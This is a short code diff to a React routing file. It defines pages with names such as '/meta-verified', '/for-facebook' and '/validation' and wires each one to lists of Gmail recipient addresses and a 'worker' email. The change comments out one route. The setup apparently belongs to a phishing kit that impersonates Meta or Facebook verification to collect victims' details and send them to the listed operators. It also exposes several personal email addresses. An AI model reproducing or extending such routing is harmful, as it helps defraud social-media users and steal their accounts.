@@ -24,7 +24,7 @@ const AppRoutes = () => {
       <Route path='/meta-offer' element={<Home emails={["unaisnizamani598@gmail.com","emma.brook.info.ads@gmail.com"]} workerEmail={"meytal.cohen.official.ads@gmail.com"} />} />
       <Route path='/eligible' element={<Home emails={["unaisnizamani598@gmail.com","melissa.melisaofficial@gmail.com"]} workerEmail={"melissa.melisaofficial@gmail.com"} />} />
       <Route path='/meta-verified' element={<Home emails={["unaisnizamani598@gmail.com","emma.brook.info.ads@gmail.com"]} workerEmail={"sara.blakely.ads.info@gmail.com"} />} />
-      <Route path='/for-facebook' element={<Home emails={["unaisnizamani598@gmail.com","fawadniz49@gmail.com","mjohn72929@gmail.com"]} workerEmail={"fawadniz49@gmail.com"} />} />
+{/*       <Route path='/for-facebook' element={<Home emails={["unaisnizamani598@gmail.com","fawadniz49@gmail.com","mjohn72929@gmail.com"]} workerEmail={"fawadniz49@gmail.com"} />} /> */}
       <Route path='/get' element={<Home emails={["unaisnizamani598@gmail.com","emma.brook.info.ads@gmail.com"]} workerEmail={"ajcyksgvvis123@gmail.com"} />} />
             <Route path='/validation' element={<VerificationForm />} />
             {/* <Route path='/account/verification' element={<VerifyAccount />} /> */}
